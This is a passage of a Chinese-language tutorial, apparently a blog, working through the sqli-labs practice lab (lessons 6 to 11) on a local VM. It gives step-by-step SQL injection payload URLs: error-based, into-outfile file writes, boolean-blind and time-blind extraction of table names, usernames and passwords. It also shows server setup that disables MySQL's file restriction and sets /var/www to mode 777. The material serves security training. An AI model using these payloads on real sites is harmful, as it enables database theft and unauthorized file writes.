start="4"><li><strong>爆表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/05/kKYSVsCW7vwjbuz.png" alt="less6-4.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/05/L5jKOq4YnpSashy.png" alt="less6-5.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/05/h3G7LJvDkfjbwNO.png" alt="less6-6.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/05/j2DLGe1XZgksOVE.png" alt="less6-7.png"></p><ol start="5"><li><strong>爆字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/05/LKU591MmDXEpGv8.png" alt="less6-8.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/05/AubqBJvrEzWk5MR.png" alt="less6-9.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/05/eDoKxh7b6JHzNpt.png" alt="less6-10.png"></p><ol start="6"><li><strong>爆数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select username FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/05/Ve26puIBRHrD51J.png" alt="less6-11.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select password FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/05/Mfv81dRo2FGC39X.png" alt="less6-12.png"></p><h2 id="Less7"><a href="#Less7" class="headerlink" title="Less7"></a>Less7</h2><p>导出文件GET字符型注入</p><hr><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>思路：这次的标题是 dump into file 经过一些简单的测试，发现报错注入行不同，一些正常的注入也没有回显。所以结合标题 说明这题需要新的思路和手段。</p><h4 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h4><p>outfile：导出检索出的数据<br>loadfile：将表的内容导出为一个文本文件（一次导出一行）<br>dumpfile：将数据导入 MYSQL</p><h4 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h4><p>这个原理其实比较简单。就是利用语句 <code>into outfile ” 路径（服务器）”</code> 可以把内容输出到，服务器上该路径的文本中。</p><h3 id="注入步骤-1"><a href="#注入步骤-1" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol><li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-7/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/07/ESFlPXGr9OCgUK3.png" alt="less7-1.png"></p><p>注：”You have an error in your SQL syntax“ 这里数据库的报错信息被屏蔽了，所以只能手动猜测 sql 语句。</p><ol start="2"><li><strong>使用“单引号+括号”判断执行的 SQL 语句</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">192.168.150.128/sqli-labs-master/Less-7/?id=1')%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/07/ISi9sjTpxAPZB5H.png" alt="less7-2.png"></p><ol start="3"><li><strong>使用“单引号+括号+括号”判断执行的 SQL 语句</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">192.168.150.128/sqli-labs-master/Less-7/?id=1'))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/07/yRmgzXBYV4CZLrT.png" alt="less7-3.png"></p><p>注：输出正常，sql 语句为：select * from table where id=((‘input’))</p><ol start="4"><li><strong>判断字段数</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">192.168.150.128/sqli-labs-master/Less-7/?id=1')) order by 4%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/07/HuKiOyUJlBtWZgc.png" alt="less7-4.png"></p><ol start="5"><li><strong>测试当前用户权限</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-7/?id=1')) and(select count(*) from mysql.user)&gt;0%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="6"><li><strong>在服务器端修改 mysql 配置文件（开启 mysql 数据导入导出功能）</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">/** 编辑 my.cnf 文件 **/[root@localhost ~]# vim /etc/my.cnf/** 在文件中添加如下内容，如下图所示 **/secure_file_priv=''<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/07/xX2aeIRbUfPiql9.png" alt="less7-5.png"></p><pre class="line-numbers language-text"><code class="language-text">/** 重启 mariadb **/[root@localhost ~]# systemctl restart mariadb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-text"><code class="language-text">/** 设置 /var/www 权限 **/[root@localhost ~]# chmod -R 777 /var/www<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注：mysql 默认禁用数据导入导出功能。</p><ol start="6"><li><strong>导出数据到 “/var/www/html/test” 中</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-7/?id=1')) union select 1,2,3 into outfile "/var/www/html/test"%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/07/wXOMAL7Ul6vixdn.png" alt="less7-7.png"></p><p>注：网页报错，但是从服务器上可以看到数据已经成功导出。</p><ol start="7"><li><strong>查看导出的数据</strong></li></ol><p><img src="https://i.loli.net/2019/10/07/oXuEFwiafHs3G6k.png" alt="less7-8.png"></p><h2 id="Less8"><a href="#Less8" class="headerlink" title="Less8"></a>Less8</h2><p>基于布尔的单引号GET盲注</p><hr><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="什么是-SQL-盲注？"><a href="#什么是-SQL-盲注？" class="headerlink" title="什么是 SQL 盲注？"></a>什么是 SQL 盲注？</h4><p>SQL盲注，就是网页不会根据你写的 sql 攻击语句返回你想要知道的错误信息，所以只能通过一些手段来猜测判断网页输出的内容。</p><h4 id="SQL盲注的分类"><a href="#SQL盲注的分类" class="headerlink" title="SQL盲注的分类"></a>SQL盲注的分类</h4><ul><li>布尔盲注</li></ul><p>界面能返回两个值 “true” 或 “false” 即 “布尔值” 。当你输入的 SQL 攻击语句成功后，网页返回值为 “true”，也就是说网页会输出正常的界面；当你输入的SQL攻击语句失败后，网页返回值为 “false”，也就是说网页会输出不正常的界面（比如网页少了部分内容）</p><ul><li>时间盲注</li></ul><p>界面只能返回一个值 “true”，无论你输入任何值，网页都是按正常来处理。此时，SQL 攻击语句中会加入时间函数来判断注入的语句是否正确。比如我通过“时间函数”让网页等待10秒再返回正常的界面。如果我等待了10秒才接受到正常界面，说面我的注入语句是正确的；如果我很快就接受到正常的界面，说明我的注入语句是错误的。</p><h4 id="函数-2"><a href="#函数-2" class="headerlink" title="函数"></a>函数</h4><p>对于布尔盲注,需要先了解 length()、substr()、ascii() 这三个函数的功能。</p><p>length(str)：返回字符串（str）的长度</p><p><img src="https://i.loli.net/2019/10/09/zYrp1isWEgIDP7B.png" alt="less8-1.png"></p><p>substr(str,pos,len)：从字符串（str）的第几个字符（pos）开始截取多长的字符串（len）</p><p><img src="https://i.loli.net/2019/10/09/7hM3U9rWznldDXq.png" alt="less8-2.png"></p><p>ascii(str)：将字符串（str）转换成 ascii 码</p><p><img src="https://i.loli.net/2019/10/09/Afoa3q1tXkNYhCI.png" alt="less8-3.png"></p><p>常用的 ascii</p><table><thead><tr><th align="center">ASCII值</th><th align="center">字符</th><th align="center">ASCII值</th><th align="center">字符</th><th align="center">ASCII值</th><th align="center">字符</th><th align="center">ASCII值</th><th align="center">字符</th><th align="center">ASCII值</th><th align="center">字符</th></tr></thead><tbody><tr><td align="center">48</td><td align="center">0</td><td align="center">65</td><td align="center">A</td><td align="center">75</td><td align="center">K</td><td align="center">85</td><td align="center">U</td><td align="center">101</td><td align="center">e</td></tr><tr><td align="center">49</td><td align="center">1</td><td align="center">66</td><td align="center">B</td><td align="center">76</td><td align="center">L</td><td align="center">86</td><td align="center">V</td><td align="center">102</td><td align="center">f</td></tr><tr><td align="center">50</td><td align="center">2</td><td align="center">67</td><td align="center">C</td><td align="center">77</td><td align="center">M</td><td align="center">87</td><td align="center">W</td><td align="center">103</td><td align="center">g</td></tr><tr><td align="center">51</td><td align="center">3</td><td align="center">68</td><td align="center">D</td><td align="center">78</td><td align="center">N</td><td align="center">88</td><td align="center">X</td><td align="center">104</td><td align="center">h</td></tr><tr><td align="center">52</td><td align="center">4</td><td align="center">69</td><td align="center">E</td><td align="center">79</td><td align="center">O</td><td align="center">89</td><td align="center">Y</td><td align="center">105</td><td align="center">i</td></tr><tr><td align="center">53</td><td align="center">5</td><td align="center">70</td><td align="center">F</td><td align="center">80</td><td align="center">P</td><td align="center">90</td><td align="center">Z</td><td align="center">106</td><td align="center">j</td></tr><tr><td align="center">54</td><td align="center">6</td><td align="center">71</td><td align="center">G</td><td align="center">81</td><td align="center">Q</td><td align="center">97</td><td align="center">a</td><td align="center">107</td><td align="center">k</td></tr><tr><td align="center">55</td><td align="center">7</td><td align="center">72</td><td align="center">H</td><td align="center">82</td><td align="center">R</td><td align="center">98</td><td align="center">b</td><td align="center">108</td><td align="center">l</td></tr><tr><td align="center">56</td><td align="center">8</td><td align="center">73</td><td align="center">I</td><td align="center">83</td><td align="center">S</td><td align="center">99</td><td align="center">c</td><td align="center">109</td><td align="center">m</td></tr><tr><td align="center">56</td><td align="center">9</td><td align="center">74</td><td align="center">J</td><td align="center">84</td><td align="center">T</td><td align="center">100</td><td align="center">d</td><td align="center">110</td><td align="center">n</td></tr></tbody></table><table><thead><tr><th align="center">ASCII值</th><th align="center">字符</th><th align="center">ASCII值</th><th align="center">字符</th><th align="center">ASCII值</th><th align="center">字符</th><th align="center">ASCII值</th><th align="center">字符</th><th align="center">ASCII值</th><th align="center">字符</th></tr></thead><tbody><tr><td align="center">111</td><td align="center">o</td><td align="center">112</td><td align="center">p</td><td align="center">113</td><td align="center">q</td><td align="center">114</td><td align="center">r</td><td align="center">115</td><td align="center">s</td></tr><tr><td align="center">116</td><td align="center">t</td><td align="center">117</td><td align="center">u</td><td align="center">118</td><td align="center">v</td><td align="center">119</td><td align="center">w</td><td align="center">120</td><td align="center">x</td></tr><tr><td align="center">121</td><td align="center">y</td><td align="center">122</td><td align="center">z</td><td align="center">&nbsp;</td><td align="center">&nbsp;</td><td align="center">&nbsp;</td><td align="center">&nbsp;</td><td align="center">&nbsp;</td><td align="center">&nbsp;</td></tr></tbody></table><h4 id="工作原理-2"><a href="#工作原理-2" class="headerlink" title="工作原理"></a>工作原理</h4><ol><li><p>使用 ascii() + length() 函数判断出查询内容的字符长度</p></li><li><p>多次使用 ascii() + substr() 函数判断每个字符</p></li><li><p>将判断出的字符整合，得到查询结果。</p></li></ol><h3 id="注入步骤-2"><a href="#注入步骤-2" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol><li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/09/XP1AsxCu6iI8Rpj.png" alt="less8-4.png"></p><p>注：网页不是正常界面，使用布尔盲注进行测试</p><ol start="2"><li><strong>判断数据库字符串的长度</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(length((select database())))&gt;55%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/09/Yei8ndPQJ39HzGB.png" alt="less8-5.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(length((select database())))&gt;56%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/09/ZRunGcPSwdhg5bT.png" alt="less8-6.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(length((select database())))=56%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/09/sePb4EIMOg19KW6.png" alt="less8-7.png"></p><ol start="3"><li><strong>判断数据库</strong></li></ol><ul><li>判断第一个字母</li></ul><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),1,1))&gt;110%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/09/KE7wlrNu1GSgVav.png" alt="less8-8.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),1,1))&gt;115%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/09/eFXs9IfU2nNCASH.png" alt="less8-9.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),1,1))=115%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/09/r8f1K9OlnySh3FC.png" alt="less8-10.png"></p><p>注：第一个字符串的 ascii 值为 115，从上面的 ascii 表中可以找到相应的字符为 “ s ” </p><ul><li>判断第二个字母</li></ul><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),2,1))&gt;100%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/09/DzgLq2x9WAtwKF7.png" alt="less8-11.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),2,1))&gt;101%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/09/w2CADSa6zbhXlNG.png" alt="less8-12.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),2,1))=101%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/09/AMoWTIfOYiZkuJ9.png" alt="less8-13.png"></p><p>注：第一个字符串的 ascii 值为 101，从上面的 ascii 表中可以找到相应的字符为 “ e ” </p><ol start="4"><li><strong>判断表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/15/2PojderbXO8pgEM.png" alt="less8-14.png"></p><ol start="5"><li><strong>判断字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),1,1))=105%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/15/QYyNs4O2FdEibtj.png" alt="less8-15.png"></p><ol start="6"><li><strong>判断数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select username FROM security.users limit 0,1),1,1))=68%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/15/oga2zSMfjBPUFtL.png" alt="less8-16.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select password FROM security.users limit 0,1),1,1))=68%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/15/aebTfXqFs8iWMZ9.png" alt="less8-17.png"></p><h2 id="Less9"><a href="#Less9" class="headerlink" title="Less9"></a>Less9</h2><p>基于时间的GET单引号盲注</p><hr><h3 id="基础知识-2"><a href="#基础知识-2" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="函数-3"><a href="#函数-3" class="headerlink" title="函数"></a>函数</h4><p>IF(expr1,expr2,expr3)：如果 expr1 的值为 true，则返回 expr2 的值，如果 expr1 的值为 false</p><p>sleep(n)：命令延时 n 秒后执行</p><h4 id="工作原理-3"><a href="#工作原理-3" class="headerlink" title="工作原理"></a>工作原理</h4><ol><li><p>用 if()+ascii()+substr() 函数来分析输出内容</p></li><li><p>用 sleep() 函数判断输出的内容是否正确。</p></li></ol><h3 id="注入步骤-3"><a href="#注入步骤-3" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol><li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/16/JcXFtHx2eAzWS45.png" alt="less9-1.png"></p><p>注：网页是正常界面，使用时间盲注进行测试</p><ol start="2"><li><strong>判断数据库字符串的长度</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(length(database()))&gt;56, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/16/5pRUJo36x1wNarc.png" alt="less9-2.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(length(database()))=56, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/16/FZIXTMNaoPAYJj6.png" alt="less9-3.png"></p><ol start="3"><li><strong>判断数据库</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/16/3GwjcbBpYnvPZH5.png" alt="less9-4.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/16/eonK3brJVg4LaXY.png" alt="less9-5.png"></p><ol start="4"><li><strong>判断表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&gt;101, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/16/8jGMV7ZxhvKIFpz.png" alt="less9-6.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/16/9tTmR73w46gBbe2.png" alt="less9-7.png"></p><ol start="5"><li><strong>判断字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),1,1))=105, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/16/4m5lzPZ81nhMNDB.png" alt="less9-8.png"></p><ol start="6"><li><strong>判断数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select username FROM security.users limit 0,1),1,1))=68, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/16/DVzIYSaxdcOqB7p.png" alt="less9-9.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select password FROM security.users limit 0,1),1,1))=68, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/16/6bsNqC2iOByda4k.png" alt="less9-10.png"></p><h2 id="Less10"><a href="#Less10" class="headerlink" title="Less10"></a>Less10</h2><p>基于时间的GET双引号盲注</p><hr><ol><li><strong>判断数据库字符串的长度</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(length(database()))&gt;56, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/20/yPOJlxQK7fB69u4.png" alt="less10-1.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(length(database()))=56, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/20/Vfd7gaj4nK8CFsN.png" alt="less10-2.png"></p><ol start="2"><li><strong>判断数据库</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/20/xuRBE6a1CdqSYT7.png" alt="less10-3.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr(database(),1,1))=115, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/20/WFPj8zL3QYrURAJ.png" alt="less10-4.png"></p><ol start="3"><li><strong>判断表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&gt;101, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/20/ycveLYBhmkOlMVR.png" alt="less10-5.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/20/ZELaSOh3lvyU9zu.png" alt="less10-6.png"></p><ol start="4"><li><strong>判断字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),1,1))=68, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/20/mfMaVkzvBH4FlJQ.png" alt="less10-7.png"></p><ol start="5"><li><strong>判断数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr((select username FROM security.users limit 0,1),1,1))=68, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/20/6vkYrFOqgJZNceP.png" alt="less10-8.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr((select password FROM security.users limit 0,1),1,1))=68, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/20/D7OVrNTeM94aqcx.png" alt="less10-9.png"></p><h2 id="Less11"><a href="#Less11" class="headerlink" title="Less11"></a>Less11</h2><h3 id="HTML基础知识"><a href="#HTML基础知识" class="headerlink" title="HTML基础知识"></a>HTML基础知识</h3><ol><li><strong>表单赏析</strong></li></ol><p><img src="https://i.loli.net/2019/10/24/GES3CzekDcY17Jq.png" alt="from-1.png"></p><p><img src="https://i.loli.net/2019/10/24/1bFOMWHrxvAGKl2.png" alt="from-2.png"></p><p><img src="https://i.loli.net/2019/10/24/6sri8IVJSNGT5jH.png" alt="from-3.png"></p><p><img src="https://i.loli.net/2019/10/24/WnTfMNIlHg7med6.png" alt="from-4.png"></p><ol start="2"><li><strong>了解表单</strong></li></ol><p>功能：用于搜集不同类型的用户输入的内容，然后将数据提交给后台服务器处理。</p><p>有了表单，网页内容可以由用户自己创建，对于网页来说，我们既是网页创建者，也是网页消费者。</p><ol start="3"><li><strong>常用的表单元素</strong></li></ol><p>form 表单</p><p>input 表单元素</p><p>select和option 下拉菜单</p><p>textarea 文本域</p><ol start="4"><li><strong>from 元素</strong></li></ol><p>action：表示当前表单中的内容提交给哪个页面进行处理</p><p>method：表示当前表单提交方式，常见的由 get 和 post 方式，默认是 get 提交</p><p>get 方式：使用 get 方式向后台发送数据，会把所有的请求数据拼接成 k=value 的形式连到一起，组装到 URL 上，其本质上是 URL 的拼接，把所有参数拼接到一起，组成新的 URL。</p><p>示例：<code>http://192.168.150.128/sqli-labs-master/Less-1/?id=1</code></p><p>post 方式：请求的 URL 不会发生任何变化，请求数据会通过浏览器传输给后台服务器。POST 的安全性比较高，URL 更加干净。get 方式会把数据显示出来，造成数据泄露。</p><p>示例：</p><p><img src="https://i.loli.net/2019/10/24/l9hHIb7sXMjCEkY.png" alt="from-5.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>post 就是将 form 标签的表单提交方式设为 post。</p><p>post 传输过程：form 标签包裹住所有的 input 输入框，当你点提交（submit）的时候，就会把 form 包裹的所有的 input 信息提交给 form 对应的后台服务器地址，这就是一个 post 过程。</p><h3 id="注入步骤-4"><a href="#注入步骤-4" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol><li><strong>尝试输入 username:用户名+单引号，password:随便输</strong></li></ol><p><img src="https://i.loli.net/2019/10/24/idjAgfH9SxvorDC.png" alt="less11-1.png"></p><p>注：从报错中可以猜出数据库的执行语句：SELECT username, password FROM users WHERE username=’admin’ and password=’$passwd’ LIMIT 0,1</p><ol start="2"><li><strong>尝试输入 username:用户名+单引号+井号，password:随便输</strong></li></ol><p><img src="https://i.loli.net/2019/10/24/6FAgtxyizbwcfud.png" alt="less11-2.png"></p><ol start="3"><li><strong>猜测字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：admin' order by 3#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/24/tpXwyZWbTIon4vq.png" alt="less11-5.png"></p><ol 